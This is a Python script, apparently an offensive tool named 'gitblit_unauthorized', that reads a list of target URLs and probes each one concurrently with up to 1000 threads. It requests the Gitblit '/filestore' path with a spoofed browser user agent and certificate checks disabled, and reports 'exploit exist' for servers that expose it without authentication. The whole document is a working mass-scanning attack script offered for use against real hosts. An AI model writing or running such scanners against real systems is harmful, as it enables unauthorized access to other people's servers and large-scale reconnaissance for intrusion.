#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

class gitblit():
    def _banner():
        banner = r'''
        ________  ___  _________  ________  ___       ___  _________   
        |\   ____\|\  \|\___   ___\\   __  \|\  \     |\  \|\___   ___\ 
        \ \  \___|\ \  \|___ \  \_\ \  \|\ /\ \  \    \ \  \|___ \  \_| 
        \ \  \  __\ \  \   \ \  \ \ \   __  \ \  \    \ \  \   \ \  \  
        \ \  \|\  \ \  \   \ \  \ \ \  \|\  \ \  \____\ \  \   \ \  \ 
        \ \_______\ \__\   \ \__\ \ \_______\ \_______\ \__\   \ \__\
            \|_______|\|__|    \|__|  \|_______|\|_______|\|__|    \|__|
            
            gitblit_unauthorized

                If u need to use proxies, uncomment proxies

                                                                    - ache

        '''
        print(banner)

    def check_url(ip):

        # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"
        }

        try:
            
            if ip[-1] != "/":
                ip += "/"
            url=ip+ "filestore"

            # r = requests.get(url =url, headers=headers,proxies=proxies, verify=False)
            r = requests.get(url =url, headers=headers, verify=False)
            requests.packages.urllib3.disable_warnings()
            if r.status_code == 200 and 'filestore' in r.text:
                print("***** exploit exist: " + url )
            else:
                sys.exit("Exploit failed! :(")
                
        except KeyboardInterrupt:
            sys.exit("\nClosing shell...")
        except Exception as e:
            sys.exit(str(e))

    if __name__ == '__main__':
        _banner()
        if len(sys.argv) == 1:
            print("Usage:python gitblit_unauthorized.py url.txt")
        file = sys.argv[1]
        with open(file, "r", encoding='UTF-8') as f:
            line = [i for i in f.readlines()]
        with ThreadPoolExecutor(1000) as pool:
                for target in line:
                    target=target.strip()
                    pool.submit(check_url, target)